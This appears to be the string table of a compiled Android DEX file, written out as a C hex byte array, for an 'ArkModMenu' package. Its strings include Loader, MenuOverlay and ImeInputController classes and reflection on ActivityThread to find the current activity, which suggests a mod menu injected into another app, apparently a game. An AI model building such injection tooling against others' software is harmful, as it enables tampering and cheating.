    0x45, 0x53, 0x33, 0x4a, 0x4e, 0x49, 0x56, 0x69, 0x65, 0x77, 0x3b, 0x00, 0x30, 0x4c, 0x63, 0x6f, 
    0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 
    0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x49, 0x6d, 0x65, 0x49, 0x6e, 0x70, 0x75, 0x74, 
    0x43, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x6c, 0x65, 0x72, 0x24, 0x31, 0x3b, 0x00, 0x30, 0x4c, 
    0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 
    0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x49, 0x6d, 0x65, 0x49, 0x6e, 0x70, 
    0x75, 0x74, 0x43, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x6c, 0x65, 0x72, 0x24, 0x32, 0x3b, 0x00, 
    0x30, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 
    0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x49, 0x6d, 0x65, 0x49, 
    0x6e, 0x70, 0x75, 0x74, 0x43, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x6c, 0x65, 0x72, 0x24, 0x33, 
    0x3b, 0x00, 0x30, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 
    0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x49, 0x6d, 
    0x65, 0x49, 0x6e, 0x70, 0x75, 0x74, 0x43, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x6c, 0x65, 0x72, 
    0x24, 0x34, 0x3b, 0x00, 0x30, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 
    0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 
    0x49, 0x6d, 0x65, 0x49, 0x6e, 0x70, 0x75, 0x74, 0x43, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x6c, 
    0x65, 0x72, 0x24, 0x35, 0x3b, 0x00, 0x2e, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 
    0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 
    0x75, 0x2f, 0x49, 0x6d, 0x65, 0x49, 0x6e, 0x70, 0x75, 0x74, 0x43, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 
    0x6c, 0x6c, 0x65, 0x72, 0x3b, 0x00, 0x26, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 
    0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 
    0x75, 0x2f, 0x4c, 0x6f, 0x61, 0x64, 0x65, 0x72, 0x24, 0x31, 0x24, 0x31, 0x3b, 0x00, 0x26, 0x4c, 
    0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 
    0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x4c, 0x6f, 0x61, 0x64, 0x65, 0x72, 
    0x24, 0x31, 0x24, 0x32, 0x3b, 0x00, 0x24, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 
    0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 
    0x75, 0x2f, 0x4c, 0x6f, 0x61, 0x64, 0x65, 0x72, 0x24, 0x31, 0x3b, 0x00, 0x22, 0x4c, 0x63, 0x6f, 
    0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 
    0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x4c, 0x6f, 0x61, 0x64, 0x65, 0x72, 0x3b, 0x00, 
    0x29, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 
    0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x4d, 0x65, 0x6e, 0x75, 
    0x4f, 0x76, 0x65, 0x72, 0x6c, 0x61, 0x79, 0x24, 0x31, 0x3b, 0x00, 0x29, 0x4c, 0x63, 0x6f, 0x6d, 
    0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 0x6d, 
    0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x4d, 0x65, 0x6e, 0x75, 0x4f, 0x76, 0x65, 0x72, 0x6c, 
    0x61, 0x79, 0x24, 0x32, 0x3b, 0x00, 0x27, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 
    0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 
    0x75, 0x2f, 0x4d, 0x65, 0x6e, 0x75, 0x4f, 0x76, 0x65, 0x72, 0x6c, 0x61, 0x79, 0x3b, 0x00, 0x23, 
    0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 
    0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x52, 0x24, 0x63, 0x6f, 0x6c, 
    0x6f, 0x72, 0x3b, 0x00, 0x26, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 
    0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 
    0x52, 0x24, 0x64, 0x72, 0x61, 0x77, 0x61, 0x62, 0x6c, 0x65, 0x3b, 0x00, 0x24, 0x4c, 0x63, 0x6f, 
    0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 
    0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x52, 0x24, 0x6c, 0x61, 0x79, 0x6f, 0x75, 0x74, 
    0x3b, 0x00, 0x24, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 
    0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x52, 0x24, 
    0x6d, 0x69, 0x70, 0x6d, 0x61, 0x70, 0x3b, 0x00, 0x24, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 
    0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 
    0x65, 0x6e, 0x75, 0x2f, 0x52, 0x24, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x00, 0x23, 0x4c, 
    0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 
    0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x52, 0x24, 0x73, 0x74, 0x79, 0x6c, 
    0x65, 0x3b, 0x00, 0x21, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 
    0x30, 0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x52, 
    0x24, 0x78, 0x6d, 0x6c, 0x3b, 0x00, 0x1d, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 
    0x6c, 0x6d, 0x39, 0x30, 0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 
    0x75, 0x2f, 0x52, 0x3b, 0x00, 0x22, 0x4c, 0x64, 0x61, 0x6c, 0x76, 0x69, 0x6b, 0x2f, 0x61, 0x6e, 
    0x6e, 0x6f, 0x74, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x45, 0x6e, 0x63, 0x6c, 0x6f, 0x73, 0x69, 
    0x6e, 0x67, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x3b, 0x00, 0x23, 0x4c, 0x64, 0x61, 0x6c, 0x76, 0x69, 
    0x6b, 0x2f, 0x61, 0x6e, 0x6e, 0x6f, 0x74, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x45, 0x6e, 0x63, 
    0x6c, 0x6f, 0x73, 0x69, 0x6e, 0x67, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64, 0x3b, 0x00, 0x1e, 0x4c, 
    0x64, 0x61, 0x6c, 0x76, 0x69, 0x6b, 0x2f, 0x61, 0x6e, 0x6e, 0x6f, 0x74, 0x61, 0x74, 0x69, 0x6f, 
    0x6e, 0x2f, 0x49, 0x6e, 0x6e, 0x65, 0x72, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x3b, 0x00, 0x21, 0x4c, 
    0x64, 0x61, 0x6c, 0x76, 0x69, 0x6b, 0x2f, 0x61, 0x6e, 0x6e, 0x6f, 0x74, 0x61, 0x74, 0x69, 0x6f, 
    0x6e, 0x2f, 0x4d, 0x65, 0x6d, 0x62, 0x65, 0x72, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x65, 0x73, 0x3b, 
    0x00, 0x24, 0x4c, 0x64, 0x61, 0x6c, 0x76, 0x69, 0x6b, 0x2f, 0x61, 0x6e, 0x6e, 0x6f, 0x74, 0x61, 
    0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64, 0x50, 0x61, 0x72, 0x61, 0x6d, 
    0x65, 0x74, 0x65, 0x72, 0x73, 0x3b, 0x00, 0x1d, 0x4c, 0x64, 0x61, 0x6c, 0x76, 0x69, 0x6b, 0x2f, 
    0x61, 0x6e, 0x6e, 0x6f, 0x74, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x53, 0x69, 0x67, 0x6e, 0x61, 
    0x74, 0x75, 0x72, 0x65, 0x3b, 0x00, 0x18, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 
    0x67, 0x2f, 0x43, 0x68, 0x61, 0x72, 0x53, 0x65, 0x71, 0x75, 0x65, 0x6e, 0x63, 0x65, 0x3b, 0x00, 
    0x11, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x43, 0x6c, 0x61, 0x73, 
    0x73, 0x3b, 0x00, 0x11, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x46, 
    0x6c, 0x6f, 0x61, 0x74, 0x3b, 0x00, 0x13, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 
    0x67, 0x2f, 0x49, 0x6e, 0x74, 0x65, 0x67, 0x65, 0x72, 0x3b, 0x00, 0x20, 0x4c, 0x6a, 0x61, 0x76, 
    0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x49, 0x6e, 0x74, 0x65, 0x72, 0x72, 0x75, 0x70, 0x74, 
    0x65, 0x64, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x3b, 0x00, 0x10, 0x4c, 0x6a, 
    0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x4d, 0x61, 0x74, 0x68, 0x3b, 0x00, 0x21, 
    0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x4e, 0x75, 0x6d, 0x62, 0x65, 
    0x72, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 
    0x3b, 0x00, 0x12, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x4f, 0x62, 
    0x6a, 0x65, 0x63, 0x74, 0x3b, 0x00, 0x28, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 
    0x67, 0x2f, 0x52, 0x65, 0x66, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x76, 0x65, 0x4f, 0x70, 0x65, 0x72, 
    0x61, 0x74, 0x69, 0x6f, 0x6e, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x3b, 0x00, 
    0x14, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x52, 0x75, 0x6e, 0x6e, 
    0x61, 0x62, 0x6c, 0x65, 0x3b, 0x00, 0x1c, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 
    0x67, 0x2f, 0x52, 0x75, 0x6e, 0x74, 0x69, 0x6d, 0x65, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 
    0x6f, 0x6e, 0x3b, 0x00, 0x12, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 
    0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x00, 0x19, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 
    0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x42, 0x75, 0x69, 0x6c, 0x64, 0x65, 
    0x72, 0x3b, 0x00, 0x12, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x54, 
    0x68, 0x72, 0x65, 0x61, 0x64, 0x3b, 0x00, 0x15, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 
    0x6e, 0x67, 0x2f, 0x54, 0x68, 0x72, 0x6f, 0x77, 0x61, 0x62, 0x6c, 0x65, 0x3b, 0x00, 0x19, 0x4c, 
    0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x72, 0x65, 0x66, 0x6c, 0x65, 0x63, 
    0x74, 0x2f, 0x46, 0x69, 0x65, 0x6c, 0x64, 0x3b, 0x00, 0x1a, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 
    0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x72, 0x65, 0x66, 0x6c, 0x65, 0x63, 0x74, 0x2f, 0x4d, 0x65, 0x74, 
    0x68, 0x6f, 0x64, 0x3b, 0x00, 0x16, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x75, 0x74, 0x69, 0x6c, 
    0x2f, 0x43, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3b, 0x00, 0x14, 0x4c, 0x6a, 
    0x61, 0x76, 0x61, 0x2f, 0x75, 0x74, 0x69, 0x6c, 0x2f, 0x49, 0x74, 0x65, 0x72, 0x61, 0x74, 0x6f, 
    0x72, 0x3b, 0x00, 0x0f, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x75, 0x74, 0x69, 0x6c, 0x2f, 0x4d, 
    0x61, 0x70, 0x3b, 0x00, 0x2a, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x78, 0x2f, 0x6d, 0x69, 0x63, 0x72, 
    0x6f, 0x65, 0x64, 0x69, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x6b, 0x68, 0x72, 0x6f, 0x6e, 0x6f, 0x73, 
    0x2f, 0x65, 0x67, 0x6c, 0x2f, 0x45, 0x47, 0x4c, 0x43, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x3b, 0x00, 
    0x2a, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x78, 0x2f, 0x6d, 0x69, 0x63, 0x72, 0x6f, 0x65, 0x64, 0x69, 
    0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x6b, 0x68, 0x72, 0x6f, 0x6e, 0x6f, 0x73, 0x2f, 0x6f, 0x70, 0x65, 
    0x6e, 0x67, 0x6c, 0x65, 0x73, 0x2f, 0x47, 0x4c, 0x31, 0x30, 0x3b, 0x00, 0x0b, 0x4c, 0x6f, 0x61, 
    0x64, 0x65, 0x72, 0x2e, 0x6a, 0x61, 0x76, 0x61, 0x00, 0x11, 0x4d, 0x41, 0x58, 0x5f, 0x57, 0x49, 
    0x4e, 0x44, 0x4f, 0x57, 0x5f, 0x41, 0x4d, 0x4f, 0x55, 0x4e, 0x54, 0x00, 0x0f, 0x4d, 0x4f, 0x44, 
    0x45, 0x5f, 0x4d, 0x55, 0x4c, 0x54, 0x49, 0x5f, 0x4c, 0x49, 0x4e, 0x45, 0x00, 0x09, 0x4d, 0x4f, 
    0x44, 0x45, 0x5f, 0x4e, 0x4f, 0x4e, 0x45, 0x00, 0x10, 0x4d, 0x4f, 0x44, 0x45, 0x5f, 0x53, 0x49, 
    0x4e, 0x47, 0x4c, 0x45, 0x5f, 0x4c, 0x49, 0x4e, 0x45, 0x00, 0x0b, 0x4d, 0x65, 0x6e, 0x75, 0x4f, 
    0x76, 0x65, 0x72, 0x6c, 0x61, 0x79, 0x00, 0x10, 0x4d, 0x65, 0x6e, 0x75, 0x4f, 0x76, 0x65, 0x72, 
    0x6c, 0x61, 0x79, 0x2e, 0x6a, 0x61, 0x76, 0x61, 0x00, 0x02, 0x4f, 0x4b, 0x00, 0x05, 0x50, 0x61, 
    0x75, 0x73, 0x65, 0x00, 0x06, 0x52, 0x65, 0x73, 0x75, 0x6d, 0x65, 0x00, 0x07, 0x53, 0x44, 0x4b, 
    0x5f, 0x49, 0x4e, 0x54, 0x00, 0x05, 0x53, 0x74, 0x61, 0x72, 0x74, 0x00, 0x04, 0x53, 0x74, 0x6f, 
    0x70, 0x00, 0x03, 0x54, 0x41, 0x47, 0x00, 0x10, 0x54, 0x68, 0x65, 0x6d, 0x65, 0x5f, 0x41, 0x72, 
    0x6b, 0x4d, 0x6f, 0x64, 0x4d, 0x65, 0x6e, 0x75, 0x00, 0x04, 0x54, 0x69, 0x63, 0x6b, 0x00, 0x01, 
    0x56, 0x00, 0x02, 0x56, 0x46, 0x00, 0x02, 0x56, 0x49, 0x00, 0x03, 0x56, 0x49, 0x49, 0x00, 0x04, 
    0x56, 0x49, 0x49, 0x46, 0x00, 0x05, 0x56, 0x49, 0x49, 0x49, 0x49, 0x00, 0x06, 0x56, 0x49, 0x49, 
    0x49, 0x49, 0x49, 0x00, 0x07, 0x56, 0x49, 0x49, 0x49, 0x49, 0x49, 0x49, 0x00, 0x04, 0x56, 0x49, 
    0x49, 0x4c, 0x00, 0x02, 0x56, 0x4a, 0x00, 0x02, 0x56, 0x4c, 0x00, 0x03, 0x56, 0x4c, 0x46, 0x00, 
    0x03, 0x56, 0x4c, 0x49, 0x00, 0x04, 0x56, 0x4c, 0x49, 0x49, 0x00, 0x03, 0x56, 0x4c, 0x4c, 0x00, 
    0x02, 0x56, 0x5a, 0x00, 0x04, 0x56, 0x5a, 0x46, 0x46, 0x00, 0x01, 0x5a, 0x00, 0x02, 0x5a, 0x4c, 
    0x00, 0x03, 0x5a, 0x4c, 0x49, 0x00, 0x04, 0x5a, 0x4c, 0x49, 0x4c, 0x00, 0x03, 0x5a, 0x4c, 0x4a, 
    0x00, 0x03, 0x5a, 0x4c, 0x4c, 0x00, 0x02, 0x5b, 0x49, 0x00, 0x14, 0x5b, 0x4c, 0x61, 0x6e, 0x64, 
    0x72, 0x6f, 0x69, 0x64, 0x2f, 0x76, 0x69, 0x65, 0x77, 0x2f, 0x56, 0x69, 0x65, 0x77, 0x3b, 0x00, 
    0x2a, 0x5b, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x76, 0x69, 0x65, 0x77, 0x2f, 
    0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x4d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72, 0x24, 0x4c, 0x61, 
    0x79, 0x6f, 0x75, 0x74, 0x50, 0x61, 0x72, 0x61, 0x6d, 0x73, 0x3b, 0x00, 0x12, 0x5b, 0x4c, 0x6a, 
    0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x3b, 0x00, 
    0x13, 0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x4f, 0x62, 0x6a, 
    0x65, 0x63, 0x74, 0x3b, 0x00, 0x13, 0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 
    0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x00, 0x02, 0x5c, 0x7c, 0x00, 0x0b, 0x61, 
    0x63, 0x63, 0x65, 0x73, 0x73, 0x46, 0x6c, 0x61, 0x67, 0x73, 0x00, 0x12, 0x61, 0x63, 0x74, 0x69, 
    0x76, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x49, 0x6e, 0x64, 0x65, 0x78, 0x00, 0x08, 
    0x61, 0x63, 0x74, 0x69, 0x76, 0x65, 0x49, 0x64, 0x00, 0x08, 0x61, 0x63, 0x74, 0x69, 0x76, 0x69, 
    0x74, 0x79, 0x00, 0x0d, 0x61, 0x63, 0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 0x5f, 0x6d, 0x61, 0x69, 
    0x6e, 0x00, 0x07, 0x61, 0x64, 0x64, 0x56, 0x69, 0x65, 0x77, 0x00, 0x1a, 0x61, 0x6e, 0x64, 0x72, 
    0x6f, 0x69, 0x64, 0x2e, 0x61, 0x70, 0x70, 0x2e, 0x41, 0x63, 0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 
    0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x00, 0x08, 0x61, 0x70, 0x70, 0x5f, 0x6e, 0x61, 0x6d, 0x65, 
    0x00, 0x06, 0x61, 0x70, 0x70, 0x65, 0x6e, 0x64, 0x00, 0x12, 0x61, 0x70, 0x70, 0x6c, 0x79, 0x41, 
    0x63, 0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x00, 0x06, 0x61, 0x74, 
    0x74, 0x61, 0x63, 0x68, 0x00, 0x0c, 0x62, 0x61, 0x63, 0x6b, 0x75, 0x70, 0x5f, 0x72, 0x75, 0x6c, 
    0x65, 0x73, 0x00, 0x05, 0x62, 0x6c, 0x61, 0x63, 0x6b, 0x00, 0x06, 0x63, 0x61, 0x6e, 0x63, 0x65, 
    0x6c, 0x00, 0x12, 0x63, 0x61, 0x6e, 0x63, 0x65, 0x6c, 0x4b, 0x65, 0x79, 0x62, 0x6f, 0x61, 0x72, 
    0x64, 0x54, 0x65, 0x78, 0x74, 0x00, 0x05, 0x63, 0x6f, 0x6c, 0x6f, 0x72, 0x00, 0x06, 0x63, 0x6f, 
    0x6d, 0x6d, 0x69, 0x74, 0x00, 0x12, 0x63, 0x6f, 0x6d, 0x6d, 0x69, 0x74, 0x4b, 0x65, 0x79, 0x62, 
    0x6f, 0x61, 0x72, 0x64, 0x54, 0x65, 0x78, 0x74, 0x00, 0x12, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 
    0x41, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x42, 0x75, 0x74, 0x74, 0x6f, 0x6e, 0x00, 0x12, 0x63, 0x72, 
    0x65, 0x61, 0x74, 0x65, 0x42, 0x75, 0x74, 0x74, 0x6f, 0x6e, 0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 
    0x00, 0x0c, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x45, 0x64, 0x69, 0x74, 0x6f, 0x72, 0x00, 0x0f, 
    0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x49, 0x6e, 0x70, 0x75, 0x74, 0x54, 0x79, 0x70, 0x65, 0x00, 
    0x12, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x4c, 0x61, 0x79, 0x6f, 0x75, 0x74, 0x50, 0x61, 0x72, 
    0x61, 0x6d, 0x73, 0x00, 0x0b, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x61, 0x6e, 0x65, 0x6c, 
    0x00, 0x12, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x6f, 0x75, 0x63, 0x68, 0x48, 0x61, 0x6e, 
    0x64, 0x6c, 0x65, 0x72, 0x00, 0x1c, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64, 0x20, 0x74, 0x6f, 
    0x75, 0x63, 0x68, 0x20, 0x68, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x20, 0x69, 0x6e, 0x64, 0x65, 
    0x78, 0x3d, 0x00, 0x15, 0x63, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x41, 0x63, 0x74, 0x69, 0x76, 
    0x69, 0x74, 0x79, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x00, 0x12, 0x63, 0x75, 0x72, 0x72, 0x65, 
    0x6e, 0x74, 0x41, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x0d, 0x63, 
    0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x00, 0x15, 0x64, 0x61, 
    0x74, 0x61, 0x5f, 0x65, 0x78, 0x74, 0x72, 0x61, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x5f, 0x72, 0x75, 
    0x6c, 0x65, 0x73, 0x00, 0x07, 0x64, 0x65, 0x6e, 0x73, 0x69, 0x74, 0x79, 0x00, 0x0c, 0x64, 0x69, 
    0x73, 0x6d, 0x69, 0x73, 0x73, 0x4c, 0x6f, 0x63, 0x61, 0x6c, 0x00, 0x10, 0x64, 0x69, 0x73, 0x70, 
    0x61, 0x74, 0x63, 0x68, 0x4b, 0x65, 0x79, 0x45, 0x76, 0x65, 0x6e, 0x74, 0x00, 0x02, 0x64, 0x70, 
    0x00, 0x08, 0x64, 0x72, 0x61, 0x77, 0x61, 0x62, 0x6c, 0x65, 0x00, 0x06, 0x65, 0x64, 0x69, 0x74, 
    0x6f, 0x72, 0x00, 0x06, 0x65, 0x71, 0x75, 0x61, 0x6c, 0x73, 0x00, 0x18, 0x66, 0x61, 0x69, 0x6c, 
    0x65, 0x64, 0x20, 0x74, 0x6f, 0x20, 0x73, 0x68, 0x6f, 0x77, 0x20, 0x49, 0x4d, 0x45, 0x20, 0x70, 
    0x61, 0x6e, 0x65, 0x6c, 0x00, 0x10, 0x66, 0x65, 0x74, 0x63, 0x68, 0x41, 0x70, 0x70, 0x6c, 0x69, 
    0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x14, 0x66, 0x65, 0x74, 0x63, 0x68, 0x43, 0x75, 0x72, 
    0x72, 0x65, 0x6e, 0x74, 0x41, 0x63, 0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 0x00, 0x05, 0x66, 0x6c, 
    0x61, 0x67, 0x73, 0x00, 0x07, 0x66, 0x6f, 0x72, 0x4e, 0x61, 0x6d, 0x65, 0x00, 0x03, 0x67, 0x65, 
